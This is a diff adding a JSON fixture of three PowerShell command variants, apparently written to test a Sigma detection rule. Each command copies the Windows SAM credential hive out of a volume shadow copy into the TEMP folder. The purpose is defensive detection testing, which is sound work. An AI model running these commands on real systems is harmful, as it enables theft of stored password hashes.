@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\", \"${env:TEMP}\\SAMvss1\", $true)",
+    "explanation": "This command uses .NET method syntax instead of Copy-Item and omits the loop and error handling to simplify the test. It accesses a shadow copy of the SAM file, which matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"& { [System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\System32\\config\\SAM', '$env:TEMP\\SAMvss2', $true) }\"",
+    "explanation": "This command uses the -Command parameter and encloses the script block in quotes. It accesses a shadow copy of the SAM file, which matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "powershell.exe -c \"[System.IO.File]::Copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\System32\\config\\SAM', '$env:TEMP\\SAMvss3', $true)\"",
+    "explanation": "This command uses the short form of the -Command parameter (-c) and encloses the command in quotes. It accesses a shadow copy of the SAM file, which matches the Sigma rule's detection criteria."
+  }
+]
